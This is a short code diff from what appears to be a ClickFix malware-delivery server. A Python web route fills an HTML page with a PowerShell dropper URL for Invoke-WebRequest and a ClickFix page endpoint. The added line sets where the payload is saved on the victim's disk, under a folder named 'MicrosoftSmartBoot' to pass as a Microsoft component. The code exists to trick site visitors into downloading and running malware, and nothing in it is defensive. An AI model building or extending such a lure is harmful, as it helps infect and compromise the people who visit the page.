@@ -23,6 +23,7 @@ async def root_route(req:Request):
         html = await f.read()
     html = html.replace("{{PSScript URL for IWR}}",config.conf["URLS"]["powershell_dropper_url"])
     html = html.replace("{{CLICK_FIX_PAGE}}",config.conf["URLS"]["clickfix_page_endpoint"])
+    html = html.replace("{{Payload Save Path In UserDisk}}","C:\\\\MicrosoftSmartBoot")
     print(html)
     return HTMLResponse(
       html  
